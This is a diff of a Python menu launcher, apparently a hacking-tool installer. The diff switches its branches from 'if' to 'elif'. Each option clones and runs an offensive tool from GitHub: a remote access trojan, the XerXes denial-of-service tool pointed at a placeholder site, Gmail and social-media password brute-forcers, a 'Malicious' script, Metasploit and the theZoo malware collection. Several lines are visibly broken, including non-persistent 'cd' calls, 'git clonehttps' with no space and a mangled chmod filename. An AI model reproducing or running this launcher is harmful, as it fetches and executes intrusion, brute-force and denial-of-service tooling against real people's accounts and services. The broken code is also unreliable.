@@ -74,39 +74,41 @@ if number == "1" :
     os.system ("ls")
     os.system ("sh install.sh")
     os.system ("msfconsole")
-if number == "2" :
+elif number == "2":
      os.system("cd")
      os.system(" git clone https://github.com/Xi4u7/A-Rat")
      os.system("cd A-Rat")
      os.system("chmod +x * ")
      os.system("python2 A-Rat.py")
-if number == "3" :
+elif number == "3" :
      os.system("git clone https://github.com/CyberXCodder/XerXes.git")
      os.system("cd XerXes")
      os.system("gcc xerxes.c -o xerxes")
      os.system("./xerxes www.fakesite.com 80")
-if number == "4" :
+elif number == "4" :
      os.system("git clone https://github.com/samsesh/SocialBox-Termux.git")
      os.system("cd SocialBox-Termux")  
      os.system("chmod 777 install-sb.shSocialBox.sh")
      os.system("bash install-sb.sh")
      os.system("bash SocialBox.sh")
-if number == "5" :
+elif number == "5" :
     os.system(" git clonehttps://github.com/NeloF4/brutegmail")
     os.system("cd brutegmail")
     os.system("chmod 777 Hellow.py wordlist.txt")
     os.system(" python Hellow.py")
-if number == "6" :
+elif number == "6" :
     os.system("git clone https://github.com/MaulanaRyM/Malicious")
     os.system(" cd Malicious")
     os.system(" cd Malicious")
     os.system("chmod 777 requirements.txt malicious.py")
     os.system(" pip2 install -r requirements.txt")
     os.system("python2 malicious.py")
-if number == "7" :
+elif number == "7" :
     os.system("git clone https://www.github.com/ytisf/theZoo")
     os.system("cd theZoo")
     os.system("pip install --user -r requirements.txt")
     os.system("python theZoo.py ")
-if number == "8" :
+elif number == "8" :
     os.system("exit")
+else:
+    print ("wrong number")
